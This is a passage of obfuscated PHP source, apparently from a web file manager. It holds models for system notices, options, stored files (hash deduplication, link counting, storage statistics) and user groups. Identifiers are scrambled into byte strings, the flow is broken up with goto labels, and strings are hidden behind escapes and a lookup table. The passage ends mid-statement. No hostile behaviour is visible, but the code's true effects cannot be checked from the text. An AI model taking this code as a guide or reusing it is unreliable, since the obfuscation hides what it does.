$DÙ•µ¢šØë =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$CŒ‰†¾çÙ™ || count($CŒ‰†¾çÙ™) == 0) { return array(); } $c§…»²ëš = array(); goto D¡­ˆÊÜŞñ; aÊŒ½ƒù: } } define($_SERVER[¼€¼ˆ¦‚¡][545], $_SERVER[¼€¼ˆ¦‚¡][546]); goto E‡¨æÅéôì; bËİÑíÎ×É: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\156\157\164\151\x63\145\x4c\x69\163\164"; public $field = array("\156\141\x6d\x65", "\143\x6f\x6e\x74\145\x6e\164", "\x61\x75\164\x68", "\155\x6f\x64\145", "\164\151\155\x65", "\164\171\x70\x65", "\154\145\166\x65\x6c", "\x65\x6e\x61\142\x6c\x65", "\x73\157\x72\164"); public function listData($C‹¹à‰±ˆĞ = false, $aÚÓ†™©‹ = "\x73\157\162\x74", $eõñÍêğÜŒ = false) { return parent::listData($C‹¹à‰±ˆĞ, $aÚÓ†™©‹, $eõñÍêğÜŒ); } public function add($F°ÙÒÕœğ) { $f¾Ë½¸”¨‹ =& $_SERVER[¼€¼ˆ¦‚¡]; $f¾â‚Öõ¦ = time(); if ($F°ÙÒÕœğ[$f¾Ë½¸”¨‹[12]] == $f¾Ë½¸”¨‹[2478]) { $f¾â‚Öõ¦ = strtotime($F°ÙÒÕœğ[$f¾Ë½¸”¨‹[190]]); } $F°ÙÒÕœğ[$f¾Ë½¸”¨‹[190]] = $f¾â‚Öõ¦; return parent::insert($F°ÙÒÕœğ); } public function update($Dè÷š•ÛšÛ, $dáí¥‘’³¦) { goto FÈ•·â¼‹; BóÈÙ·¹ó®: return parent::update($Dè÷š•ÛšÛ, $dáí¥‘’³¦); goto dÎìÄ‘„Îñ; b¡¤ ¥ß: $cÔöŞ×‚ó = time(); if ($dáí¥‘’³¦[$b‰‚ÜëÖÑ†[12]] == $b‰‚ÜëÖÑ†[2478]) { $cÔöŞ×‚ó = strtotime($dáí¥‘’³¦[$b‰‚ÜëÖÑ†[190]]); } $dáí¥‘’³¦[$b‰‚ÜëÖÑ†[190]] = $cÔöŞ×‚ó; goto BóÈÙ·¹ó®; FÈ•·â¼‹: $b‰‚ÜëÖÑ† =& $_SERVER[¼€¼ˆ¦‚¡]; $eÁÁ°”µŒ’ = $this->listData($Dè÷š•ÛšÛ); if (!$eÁÁ°”µŒ’) { return !1; } goto b¡¤ ¥ß; dÎìÄ‘„Îñ: } public function remove($Dâ…·ß÷Ò°) { $AåÍ‘Ñˆ‡½ = $this->listData($Dâ…·ß÷Ò°); if (!$AåÍ‘Ñˆ‡½ || $AåÍ‘Ñˆ‡½[$_SERVER[¼€¼ˆ¦‚¡][1080]]) { return !1; } return parent::remove($Dâ…·ß÷Ò°); } public function sort($dÄÜ£ÎË, $eÑŠœ˜ƒÚƒ) { return parent::update($dÄÜ£ÎË, $eÑŠœ˜ƒÚƒ); } public function enable($f–³ùÉºî, $cª—‚ØÏ¤Ö) { return parent::update($f–³ùÉºî, array($_SERVER[¼€¼ˆ¦‚¡][2479] => $cª—‚ØÏ¤Ö)); } private function initUserOption() { $dİŞ»äÆ‡‚ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->optionType = $dİŞ»äÆ‡‚[2480]; $this->modelType = $dİŞ»äÆ‡‚[2481]; $this->field = array($dİŞ»äÆ‡‚[2482], $dİŞ»äÆ‡‚[28], $dİŞ»äÆ‡‚[190], $dİŞ»äÆ‡‚[29], $dİŞ»äÆ‡‚[2483], $dİŞ»äÆ‡‚[685], $dİŞ»äÆ‡‚[183]); } public function userNoticeGet($f‡«¶´¨‡„ = false) { $this->initUserOption(); return parent::listData($f‡«¶´¨‡„, $_SERVER[¼€¼ˆ¦‚¡][367], !0); } public function userNoticeAdd($eî«‹­ô«) { $E‰÷ğ¢² =& $_SERVER[¼€¼ˆ¦‚¡]; $this->initUserOption(); $Cõ²Ùô‘‹ò = $this->findByKey($E‰÷ğ¢²[2482], $eî«‹­ô«[$E‰÷ğ¢²[367]]); if ($Cõ²Ùô‘‹ò) { return !0; } $CŠŒ™î×¶É = array($E‰÷ğ¢²[2482] => $eî«‹­ô«[$E‰÷ğ¢²[367]], $E‰÷ğ¢²[28] => $eî«‹­ô«[$E‰÷ğ¢²[28]], $E‰÷ğ¢²[190] => $eî«‹­ô«[$E‰÷ğ¢²[190]], $E‰÷ğ¢²[29] => isset($eî«‹­ô«[$E‰÷ğ¢²[29]]) ? $eî«‹­ô«[$E‰÷ğ¢²[29]] : 1, $E‰÷ğ¢²[2483] => isset($eî«‹­ô«[$E‰÷ğ¢²[2483]]) ? $eî«‹­ô«[$E‰÷ğ¢²[2483]] : 0, $E‰÷ğ¢²[685] => 0, $E‰÷ğ¢²[183] => 0); return parent::insert($CŠŒ™î×¶É); } public function userNoticeEdit($c…Ã°­ìê§, $cÈ¢¨‹îÍ•) { $this->initUserOption(); return parent::update($c…Ã°­ìê§, $cÈ¢¨‹îÍ•); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\145\155\x5f\157\160\164\x69\x6f\x6e"; protected $jsonField = array("\x6d\x65\x6e\x75", "\162\x6f\154\x65", "\162\x6f\154\x65\107\x72\x6f\x75\160", "\x72\145\x67\151\163\164", "\x65\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($b»Î–…„) { return "\123\171\163\164\145\155\117\x70\x74\x69\x6f\x6e\137{$b»Î–…„}"; } protected function optionDefault($CŒç¬êõ = '') { $fƒµºŸŠÁ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($CŒç¬êõ == $fƒµºŸŠÁ[33]) { return $GLOBALS[$fƒµºŸŠÁ[6]][$fƒµºŸŠÁ[2484]]; } } } class SystemRecordModel extends ModelBaseLight { } goto AÅ¹Œ¼¶£ó; E˜ˆãØÛÕ: class FileModel extends ModelBase { protected $tableName = "\x69\157\137\146\151\154\x65"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\141\x6d\x65" => "\151\x6f\137\146\151\x6c\x65\137\x6d\145\164\141", "\155\145\164\x61\x46\x69\145\x6c\x64" => "\146\x69\x6c\145\111\x44"); public function fileInfo($fËÃŠ…ÁÍÜ) { $F×Ù…â÷» =& $_SERVER[¼€¼ˆ¦‚¡]; static $C’¶­Á¡× = array(); if (!isset($C’¶­Á¡×[$fËÃŠ…ÁÍÜ])) { $F•î²×ğïŒ = $F×Ù…â÷»[2147]; $e¡°ŸÖÖ· = Model($F×Ù…â÷»[422])->field($F•î²×ğïŒ)->where(array($F×Ù…â÷»[420] => $fËÃŠ…ÁÍÜ))->find(); $C’¶­Á¡×[$fËÃŠ…ÁÍÜ] = $e¡°ŸÖÖ·; } return $C’¶­Á¡×[$fËÃŠ…ÁÍÜ]; } public function addFileByContent($BÅàùÅ£à‚ = '', $eÇÇÜŸäê­ = '') { goto FŠ¿ˆ²; f¯Ø©ÅášÜ: if (file_exists($A¡ÓŞôÌ¼)) { @unlink($A¡ÓŞôÌ¼); } return $cĞ¹ºŠ…ˆ; goto DÎ‹Ü‘È„ß; fî¶»ªá“£: $A¡ÓŞôÌ¼ = $bõÔ´Ü Š . $dëò™äÉÅÀ[2149] . rand_string(16); file_put_contents($A¡ÓŞôÌ¼, $BÅàùÅ£à‚); $cĞ¹ºŠ…ˆ = $this->addFile($A¡ÓŞôÌ¼, $eÇÇÜŸäê­, !0); goto f¯Ø©ÅášÜ; FŠ¿ˆ²: $dëò™äÉÅÀ =& $_SERVER[¼€¼ˆ¦‚¡]; $bõÔ´Ü Š = TEMP_PATH . $dëò™äÉÅÀ[2148]; if (!is_dir($bõÔ´Ü Š)) { mk_dir($bõÔ´Ü Š); } goto fî¶»ªá“£; DÎ‹Ü‘È„ß: } public function createFileName($e¨õß‚î¾–) { goto AÂÊÉé‰ç–; AÂÊÉé‰ç–: $E¤Àæóí  =& $_SERVER[¼€¼ˆ¦‚¡]; $c´ªë ì = IO::init($E¤Àæóí [8]); $c…ŞŒíæ¾Æ = $this->makeFilePath($e¨õß‚î¾–, $c´ªë ì); goto d­…»±ƒ; d­…»±ƒ: $bÁùñÔˆå± = $c´ªë ì->pathFather($c…ŞŒíæ¾Æ); static $a¹º‰¾Ï»È = false; $eò™„·ª÷ = $E¤Àæóí [2150] . md5($bÁùñÔˆå±); goto E·¹­Ù¶Ÿª; E·¹­Ù¶Ÿª: if (!$a¹º‰¾Ï»È && !Cache::get($eò™„·ª÷)) { $a¹º‰¾Ï»È = !0; $dÀœ…—Ğ”í = IO::mkdir($bÁùñÔˆå±); if (!IO::exist($dÀœ…—Ğ”í . $E¤Àæóí [2151])) { IO::mkfile($dÀœ…—Ğ”í . $E¤Àæóí [2151]); } Cache::set($eò™„·ª÷, 1, 3600 * 2); } return $c…ŞŒíæ¾Æ; goto FÆ¡ŸµØ’; FÆ¡ŸµØ’: } public function makeFilePath($EÙ½´ÁÏ†É, $b¥ßŒÀñ®î) { goto E°Á¯£†¢Œ; a»¶ØéÃ¿¥: switch ($ešñè¥í”) { case $c´çƒĞ¨ñÏ[2155]: $C²ÙŠ¨¬Ô… = $C²ÙŠ¨¬Ô… . $c´çƒĞ¨ñÏ[91] . $b¥ßŒÀñ®î->ext($EÙ½´ÁÏ†É); if ($b¥ßŒÀñ®î->ext($EÙ½´ÁÏ†É) == $c´çƒĞ¨ñÏ[2095]) { $C²ÙŠ¨¬Ô… .= $c´çƒĞ¨ñÏ[2156]; } break; case $c´çƒĞ¨ñÏ[2157]: goto d‰¶õÄ‹¾ì; f…×½‚†É: break; goto DÒ’ãŸœŞœ; d‰¶õÄ‹¾ì: $C›ç¡™è×È = Model($c´çƒĞ¨ñÏ[1088])->get($c´çƒĞ¨ñÏ[1335]); $d„„“Óõ­ = substr(md5($c´çƒĞ¨ñÏ[1914] . $C›ç¡™è×È . date($c´çƒĞ¨ñÏ[683])), 0, 8); $DÄ×îôË£ = KodIO::defaultIO() . date($c´çƒĞ¨ñÏ[2158]) . $d„„“Óõ­ . $c´çƒĞ¨ñÏ[8]; goto bÀç¸˜ƒÉ; bÀç¸˜ƒÉ: if ($b¥ßŒÀñ®î->ext($EÙ½´ÁÏ†É) == $c´çƒĞ¨ñÏ[2095]) { $EÙ½´ÁÏ†É .= $c´çƒĞ¨ñÏ[2156]; } $fÖ×«‡ÙäÕ = IO::fileNameAuto($DÄ×îôË£, $EÙ½´ÁÏ†É); $C²ÙŠ¨¬Ô… = $DÄ×îôË£ . $fÖ×«‡ÙäÕ; goto f…×½‚†É; DÒ’ãŸœŞœ: case $c´çƒĞ¨ñÏ[2154]: break; default: break; } return $C²ÙŠ¨¬Ô…; goto E†ØâàËˆ…; E°Á¯£†¢Œ: $c´çƒĞ¨ñÏ =& $_SERVER[¼€¼ˆ¦‚¡]; $ešñè¥í” = Model($c´çƒĞ¨ñÏ[1088])->get($c´çƒĞ¨ñÏ[2152]); $DÄ×îôË£ = KodIO::defaultIO() . date($c´çƒĞ¨ñÏ[2153]); goto dÓÂâƒ®©™; dÓÂâƒ®©™: $C²ÙŠ¨¬Ô… = $DÄ×îôË£ . rand_string(5) . short_id(100); $EÙ½´ÁÏ†É = str_replace($c´çƒĞ¨ñÏ[8], $c´çƒĞ¨ñÏ[70], KodIO::clear($EÙ½´ÁÏ†É)); if (!$EÙ½´ÁÏ†É) { $ešñè¥í” = $c´çƒĞ¨ñÏ[2154]; } goto a»¶ØéÃ¿¥; E†ØâàËˆ…: } public function addFileByRemote($DÉ¸·İØøœ, $DÄ˜ªÄÓµ, $BººÁ³Ì¿ = array()) { goto bŸØ­­Š; dÛàˆ¿Ó¾…: if ($Fé¨Ÿãº£ = $this->addFileCheckExist($BÀ¸“…‰[$fó°ÄˆÅ…[164]], $BÀ¸“…‰[$fó°ÄˆÅ…[163]], $BÀ¸“…‰[$fó°ÄˆÅ…[77]])) { return $Fé¨Ÿãº£; } return $this->addFileData($BÀ¸“…‰); goto aæ¥ÌÏÆ÷ö; bŸØ­­Š: $fó°ÄˆÅ… =& $_SERVER[¼€¼ˆ¦‚¡]; if (!IO::exist($DÉ¸·İØøœ)) { return !1; } $Føï÷ª¸‚˜ = $BººÁ³Ì¿[$fó°ÄˆÅ…[163]] ? $BººÁ³Ì¿[$fó°ÄˆÅ…[163]] : $fó°ÄˆÅ…[33]; goto eÁÖÕñµœ; eÁÖÕñµœ: $B†ç‹ñ„Æà = IO::hashMd5($DÉ¸·İØøœ, $Føï÷ª¸‚˜); $fç¿ ø°¶ = KodIO::defaultDriver(); $BÀ¸“…‰ = array($fó°ÄˆÅ…[520] => IO::size($DÉ¸·İØøœ), $fó°ÄˆÅ…[2159] => 1, $fó°ÄˆÅ…[386] => $DÄ˜ªÄÓµ, $fó°ÄˆÅ…[732] => $fç¿ ø°¶[$fó°ÄˆÅ…[367]], $fó°ÄˆÅ…[387] => $DÉ¸·İØøœ, $fó°ÄˆÅ…[2160] => $BººÁ³Ì¿[$fó°ÄˆÅ…[164]] ? $BººÁ³Ì¿[$fó°ÄˆÅ…[164]] : IO::hashSimple($DÉ¸·İØøœ), $fó°ÄˆÅ…[2161] => $B†ç‹ñ„Æà ? $B†ç‹ñ„Æà : $Føï÷ª¸‚˜); goto dÛàˆ¿Ó¾…; aæ¥ÌÏÆ÷ö: } private function addFileData($bÃ­¨ãª‚) { $DğâÄé’‚ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$bÃ­¨ãª‚) { return !1; } $bÃ­¨ãª‚[$DğâÄé’‚[77]] = intval($bÃ­¨ãª‚[$DğâÄé’‚[77]]); if (!$bÃ­¨ãª‚[$DğâÄé’‚[77]] && strlen($bÃ­¨ãª‚[$DğâÄé’‚[164]]) > 32) { $bÃ­¨ãª‚[$DğâÄé’‚[77]] = intval(substr($bÃ­¨ãª‚[$DğâÄé’‚[164]], 32)); } $b‚ŸîŸš¥ã = $this->add($bÃ­¨ãª‚); return $this->find($b‚ŸîŸš¥ã); } public function addFile($A˜ÔÏÚÁİ, $c”‹Üéö“Ò, $E‹Çë¹ = false) { $C†Ñ’ÃŒæé = IO::hashSimple($A˜ÔÏÚÁİ); $BóÅ…ÈÑ‘Ì = IO::hashMd5($A˜ÔÏÚÁİ); $bˆà¥³íÔï = IO::size($A˜ÔÏÚÁİ); if ($Eáéˆá…å¦ = $this->addFileCheckExist($C†Ñ’ÃŒæé, $BóÅ…ÈÑ‘Ì, $bˆà¥³íÔï)) { return $Eáéˆá…å¦; } $D£†öËöĞ‰ = $this->addFileMake($A˜ÔÏÚÁİ, $bˆà¥³íÔï, $C†Ñ’ÃŒæé, $BóÅ…ÈÑ‘Ì, $c”‹Üéö“Ò, $E‹Çë¹); return $this->addFileData($D£†öËöĞ‰); } public function addFileMake($Fà¼‡Æ»ÃÚ, $dâç±¿¿ïÕ, $c‚Ë„µ¡à, $eÎÌÜ—äøˆ, $C¹ˆ¿‰ãŠƒ, $A«öøŒ‘‘ë) { goto FĞ¶Ğ­İ•¹; F˜½øˆ´¾Ù: $A”æÛœ§Ÿ = KodIO::defaultDriver(); $BŠÇ³İ„õ’ = array($c˜ºŒî“÷î[520] => $dâç±¿¿ïÕ, $c˜ºŒî“÷î[2159] => 1, $c˜ºŒî“÷î[386] => $C¹ˆ¿‰ãŠƒ, $c˜ºŒî“÷î[732] => $A”æÛœ§Ÿ[$c˜ºŒî“÷î[367]], $c˜ºŒî“÷î[387] => $dæè¢Û¶Ë½, $c˜ºŒî“÷î[2160] => $c‚Ë„µ¡à, $c˜ºŒî“÷î[2161] => $eÎÌÜ—äøˆ); return $BŠÇ³İ„õ’; goto fÈê¤Ù—Äƒ; FĞ¶Ğ­İ•¹: $c˜ºŒî“÷î =& $_SERVER[¼€¼ˆ¦‚¡]; $dæè¢Û¶Ë½ = $this->createFileName($C¹ˆ¿‰ãŠƒ); $cğŸá‹¨Ä… = get_path_father($dæè¢Û¶Ë½); goto D”ÍÒ›¿˜; D”ÍÒ›¿˜: $AÜô°Î½„Ê = get_path_this($dæè¢Û¶Ë½); if ($A«öøŒ‘‘ë) { $Dºê—‰­‚„ = IO::move($Fà¼‡Æ»ÃÚ, $cğŸá‹¨Ä…, !1, $AÜô°Î½„Ê); } else { $Dºê—‰­‚„ = IO::copy($Fà¼‡Æ»ÃÚ, $cğŸá‹¨Ä…, !1, $AÜô°Î½„Ê); } if (!$Dºê—‰­‚„) { return !1; } goto F˜½øˆ´¾Ù; fÈê¤Ù—Äƒ: } public function addFileCheckExist($f­àø¨–ä£, $BªªµŠ”°¹, $f”µÑŸÁƒ») { $D†—ÈÊà¢Ä =& $_SERVER[¼€¼ˆ¦‚¡]; $d¤¨¡ÆùÕÇ = $this->findByHash($f­àø¨–ä£, $BªªµŠ”°¹); if (!$d¤¨¡ÆùÕÇ) { return !1; } $F–ÁÑ‘©‡ù = array($D†—ÈÊà¢Ä[2159] => intval($d¤¨¡ÆùÕÇ[$D†—ÈÊà¢Ä[2162]]) + 1, $D†—ÈÊà¢Ä[520] => $f”µÑŸÁƒ»); $this->where(array($D†—ÈÊà¢Ä[420] => $d¤¨¡ÆùÕÇ[$D†—ÈÊà¢Ä[419]]))->save($F–ÁÑ‘©‡ù); return $d¤¨¡ÆùÕÇ; } public function remove($aÕĞ—ƒ±Ò¿) { $this->linkCountChange($aÕĞ—ƒ±Ò¿, !1); $this->clearEmpty(); return !0; } public function linkAdd($E­…†…À±¡) { $this->linkCountChange($E­…†…À±¡, !0); } public function linkCountChange($F©‚íÒ¢Ô©, $fÀï‰¬¶ƒ) { goto fš¢ğŒŞÌ; BØéŠğÁ•é: $F›îˆâÕìá = array(); foreach ($F©‚íÒ¢Ô© as $C‚ˆ¦ÍËª¹) { $EŞ³¢Ğç‹í = $C‚ˆ¦ÍËª¹ . $e¾†÷¶–ß[33]; if (!$F›îˆâÕìá[$EŞ³¢Ğç‹í]) { $F›îˆâÕìá[$EŞ³¢Ğç‹í] = 0; } $F›îˆâÕìá[$EŞ³¢Ğç‹í]++; } $Fëñà›Ìí¬ = array(); goto AñÍğÆ¹ë°; fš¢ğŒŞÌ: $e¾†÷¶–ß =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$F©‚íÒ¢Ô©) { return; } if (!is_array($F©‚íÒ¢Ô©)) { $F©‚íÒ¢Ô© = array($F©‚íÒ¢Ô©); } goto BØéŠğÁ•é; AñÍğÆ¹ë°: foreach ($F›îˆâÕìá as $C‚ˆ¦ÍËª¹ => $BñŠœ¾¸Ÿ«) { $EŞ³¢Ğç‹í = $BñŠœ¾¸Ÿ« . $e¾†÷¶–ß[33]; if (!$Fëñà›Ìí¬[$EŞ³¢Ğç‹í]) { $Fëñà›Ìí¬[$EŞ³¢Ğç‹í] = array(); } $Fëñà›Ìí¬[$EŞ³¢Ğç‹í][] = $C‚ˆ¦ÍËª¹; } foreach ($Fëñà›Ìí¬ as $BñŠœ¾¸Ÿ« => $f«›˜ø§¸‡) { if (!$f«›˜ø§¸‡) { continue; } $BñŠœ¾¸Ÿ« = $fÀï‰¬¶ƒ ? $BñŠœ¾¸Ÿ« : -intval($BñŠœ¾¸Ÿ«); $A‘¾ï™‡Ä  = array($e¾†÷¶–ß[419] => array($e¾†÷¶–ß[7], $f«›˜ø§¸‡)); if ($BñŠœ¾¸Ÿ« < 0) { $A‘¾ï™‡Ä [$e¾†÷¶–ß[2162]] = array($e¾†÷¶–ß[928], abs($BñŠœ¾¸Ÿ«)); } $this->where($A‘¾ï™‡Ä )->setAdd($e¾†÷¶–ß[2162], $BñŠœ¾¸Ÿ«); } goto BÌößÒÏğ‚; BÌößÒÏğ‚: } public function findByHash($d”Š®ê’‚ƒ, $eùØŒÈ†ƒï = false) { $cÒìÎ„ïÁÑ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$d”Š®ê’‚ƒ && !$eùØŒÈ†ƒï) { return !1; } $b¬×Íƒ÷³¸ = array($cÒìÎ„ïÁÑ[2160] => $d”Š®ê’‚ƒ); if ($eùØŒÈ†ƒï) { $b¬×Íƒ÷³¸ = array($cÒìÎ„ïÁÑ[2161] => $eùØŒÈ†ƒï); } return $this->order($cÒìÎ„ïÁÑ[2163])->where($b¬×Íƒ÷³¸)->find(); } public function clearEmpty($fô¯¼®ñ¸ö = 0) { goto A±ÜÓ£; FĞÂæÜÏÄº: foreach ($fÕ³±â±Æ• as $fÈ©©ÉÖÜã) { $fµö¡”“Æ¡->update(1); $this->resetFile($fÈ©©ÉÖÜã); } $fµö¡”“Æ¡->end(); goto E˜Êò°íÅ¼; A±ÜÓ£: $eÄÑòôÛ¯ñ =& $_SERVER[¼€¼ˆ¦‚¡]; $dñ´©İ‹¯Á = time() - 3600 * 24 * $fô¯¼®ñ¸ö; $A÷»»Â½Üˆ = $eÄÑòôÛ¯ñ[2164] . $dñ´©İ‹¯Á; goto eÒ§¢£Ë; eÒ§¢£Ë: $fÕ³±â±Æ• = $this->where($A÷»»Â½Üˆ)->select(); if (!$fÕ³±â±Æ•) { return; } $fµö¡”“Æ¡ = new Task($eÄÑòôÛ¯ñ[2165], $eÄÑòôÛ¯ñ[33], count($fÕ³±â±Æ•)); goto FĞÂæÜÏÄº; E˜Êò°íÅ¼: } private function resetFile($E†‰ô³øˆò) { goto cóí Ú; B†ğ¸İ¾Ë¾: $b…¡è±è¬ = Model($FÄ¡ĞÃ¥æ“[2166])->where($BğëÉôò£)->count(); $e­ó´ÄÀÙ = intval($a­À‚³ÔÎ) + intval($b…¡è±è¬); if ($e­ó´ÄÀÙ == 0) { IO::remove($E†‰ô³øˆò[$FÄ¡ĞÃ¥æ“[75]]); $this->where($BğëÉôò£)->delete(); $this->metaSet($E†‰ô³øˆò[$FÄ¡ĞÃ¥æ“[419]], null, null); return; } goto D‚³ÏĞ›Ì; cóí Ú: $FÄ¡ĞÃ¥æ“ =& $_SERVER[¼€¼ˆ¦‚¡]; $BğëÉôò£ = array($FÄ¡ĞÃ¥æ“[420] => $E†‰ô³øˆò[$FÄ¡ĞÃ¥æ“[419]]); $a­À‚³ÔÎ = Model($FÄ¡ĞÃ¥æ“[1117])->where($BğëÉôò£)->count(); goto B†ğ¸İ¾Ë¾; D‚³ÏĞ›Ì: if ($E†‰ô³øˆò[$FÄ¡ĞÃ¥æ“[2162]] != $e­ó´ÄÀÙ) { $this->where($BğëÉôò£)->save(array($FÄ¡ĞÃ¥æ“[2159] => $e­ó´ÄÀÙ)); } goto aùŞÙ«ä×; aùŞÙ«ä×: } public function storageInfo($FÍ‚ììÑ›Ï = false) { goto D™¤¸ÑÆ®ò; e÷’‹òÀ–¨: $eÇ¯ùÓ×•å = 1; $F¬£é¤Ú‘Ô = 0; $fò²£óÁ² = 5000; goto f®–îĞî¿±; D™¤¸ÑÆ®ò: $d›À¡µáÙ‚ =& $_SERVER[¼€¼ˆ¦‚¡]; $e’ôÅ¢›ö” = $this->count() + 0.0; $Aç—’¾ëä = 0; goto e÷’‹òÀ–¨; f®–îĞî¿±: for ($cØ‡ÓÑ­âƒ = 0; $cØ‡ÓÑ­âƒ < $e’ôÅ¢›ö”; $cØ‡ÓÑ­âƒ = $cØ‡ÓÑ­âƒ + $fò²£óÁ²) { $e°ªç©…– = $this->limit($cØ‡ÓÑ­âƒ, $cØ‡ÓÑ­âƒ + $fò²£óÁ²)->select(); foreach ($e°ªç©…– as $aÀŞóáÖœÎ) { $eÇ¯ùÓ×•å += $aÀŞóáÖœÎ[$d›À¡µáÙ‚[77]] * $aÀŞóáÖœÎ[$d›À¡µáÙ‚[2162]]; $Aç—’¾ëä += $aÀŞóáÖœÎ[$d›À¡µáÙ‚[77]] * ($aÀŞóáÖœÎ[$d›À¡µáÙ‚[2162]] - 1); $F¬£é¤Ú‘Ô += $aÀŞóáÖœÎ[$d›À¡µáÙ‚[2162]]; } } $Cä·†ÙÃ÷Ÿ = array($d›À¡µáÙ‚[2167] => $eÇ¯ùÓ×•å, $d›À¡µáÙ‚[2168] => $Aç—’¾ëä, $d›À¡µáÙ‚[2169] => $Aç—’¾ëä / $eÇ¯ùÓ×•å, $d›À¡µáÙ‚[81] => $e’ôÅ¢›ö”, $d›À¡µáÙ‚[2170] => $F¬£é¤Ú‘Ô); return $Cä·†ÙÃ÷Ÿ; goto eÅšÄìÔ; eÅšÄìÔ: } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\165\x70"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\x61\x6d\x65" => "\x67\162\x6f\x75\160\137\x6d\145\x74\x61", "\155\x65\x74\x61\x46\151\145\154\144" => "\x67\162\157\x75\x70\x49\104"); protected function cacheFunctionAlias($a¿ôÆ”ïòğ) { $D¨¸ªÈÃ‹Æ =& $_SERVER[¼€¼ˆ¦‚¡]; return array($D¨¸ªÈÃ‹Æ[2171] => array($a¿ôÆ”ïòğ[0], $D¨¸ªÈÃ‹Æ[2172]), $D¨¸ªÈÃ‹Æ[2173] => array($a¿ôÆ”ïòğ[0], $D¨¸ªÈÃ‹Æ[2172])); } protected function getInfo($b÷ÔÎºÇ) { $CŠÊ¶åŠµÑ = $this->getInfoSimple($b÷ÔÎºÇ); if (!$CŠÊ¶åŠµÑ) { return !1; } return $this->_listDataApplyItem($CŠÊ¶åŠµÑ); } protected function getInfoSimple($EŒç¦Ò°£Â, $Céƒå¼ÅÂ— = false) { $aëŸ×¯ó«¸ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($Céƒå¼ÅÂ—) { $CÈ‚Ñ¢á©„ = array($aëŸ×¯ó«¸[2105] => intval($EŒç¦Ò°£Â)); $A•‚ñÛ¬ïÜ = $this->where($CÈ‚Ñ¢á©„)->find(); return is_array($A•‚ñÛ¬ïÜ) ? $A•‚ñÛ¬ïÜ : array(); } return $this->cacheFunctionGet($aëŸ×¯ó«¸[2174], $EŒç¦Ò°£Â); } protected function groupAdd($BøŠ–ŠôŠâ) { goto eßÍ¸çÓ‰²; BßŸÒ¬‡: if (!empty($BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[2105]])) { $DğĞğäÍæë[$E¬ï¯¢­Øì[2105]] = $BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[2105]]; } $BÎˆ©šÃ‰ = $this->add($DğĞğäÍæë); $this->setNamePinyin($BÎˆ©šÃ‰, $DğĞğäÍæë[$E¬ï¯¢­Øì[28]]); goto e‡®†×Æù¤; eßÍ¸çÓ‰²: $E¬ï¯¢­Øì =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[461]] && isset($BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[2105]]) && $BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[2105]] == 1) { if ($c…ø¯¯Ô†‰ = $this->getInfoSimple($BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[2105]], !0)) { return $BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[2105]]; } } else { $c…ø¯¯Ô†‰ = $this->getInfoSimple($BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[461]]); if (!$c…ø¯¯Ô†‰) { return !1; } } $bÜëßÓØç = $E¬ï¯¢­Øì[470]; goto D…Äë®¾ó÷; D…Äë®¾ó÷: if ($c…ø¯¯Ô†‰[$E¬ï¯¢­Øì[459]]) { $bÜëßÓØç = $c…ø¯¯Ô†‰[$E¬ï¯¢­Øì[459]] . $c…ø¯¯Ô†‰[$E¬ï¯¢­Øì[2105]] . $E¬ï¯¢­Øì[47]; } $DğĞğäÍæë = array($E¬ï¯¢­Øì[386] => $this->groupNameAuto($BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[461]], $BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[28]]), $E¬ï¯¢­Øì[368] => $BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[461]], $E¬ï¯¢­Øì[525] => $bÜëßÓØç, $E¬ï¯¢­Øì[2175] => $BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[2089]], $E¬ï¯¢­Øì[2176] => 0, $E¬ï¯¢­Øì[2109] => 0); if (isset($BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[2126]])) { $DğĞğäÍæë[$E¬ï¯¢­Øì[2126]] = $BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[2126]]; } else { $F—ñ÷Á‹¤ = $this->max($E¬ï¯¢­Øì[2126]); if (!$F—ñ÷Á‹¤) { $F—ñ÷Á‹¤ = 0; } $DğĞğäÍæë[$E¬ï¯¢­Øì[2126]] = $F—ñ÷Á‹¤ + 1; } goto BßŸÒ¬‡; e‡®†×Æù¤: if (isset($BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[2177]])) { $this->metaSet($BÎˆ©šÃ‰, array($E¬ï¯¢­Øì[2177] => $BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[2177]], $E¬ï¯¢­Øì[2178] => $BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[2178]])); unset($BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[2177]]); unset($BøŠ–ŠôŠâ[$E¬ï¯¢­Øì[2178]]); } Model($E¬ï¯¢­Øì[1117])->groupRootAdd($BÎˆ©šÃ‰); return $BÎˆ©šÃ‰; goto B˜ ·ØîÔ­; B˜ ·ØîÔ­: } protected function groupEdit($eÙïÏ†¦ç, $EÆŒ¿‹İ­£) { $D¯’ËÉÔ¦¡ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!empty($EÆŒ¿‹İ­£[$D¯’ËÉÔ¦¡[461]])) { $f¿­øŞ£ˆó = $this->getInfoSimple($eÙïÏ†¦ç); $AŒÌÓ…á¸ = $this->getInfoSimple($EÆŒ¿‹İ­£[$D¯’ËÉÔ¦¡[461]]); if (!$f¿­øŞ£ˆó 